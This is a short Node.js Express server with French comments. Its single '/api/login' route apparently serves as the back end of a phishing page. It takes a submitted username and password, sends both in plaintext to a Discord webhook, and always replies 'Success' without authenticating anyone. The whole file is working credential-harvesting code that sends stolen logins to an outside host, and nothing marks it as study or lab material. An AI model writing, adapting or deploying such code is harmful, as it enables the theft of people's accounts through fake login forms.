const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
require('dotenv').config();

const app = express();

// Middleware
app.use(cors());
app.use(express.json());

// Route pour recevoir les données de connexion
app.post('/api/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    
    // Envoie les données au webhook Discord
    await fetch(process.env.DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: `🔔 Nouvelle connexion\n👤 Username: ${username}\n🔑 Password: ${password}`
      })
    });

    res.status(200).json({ message: 'Success' });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});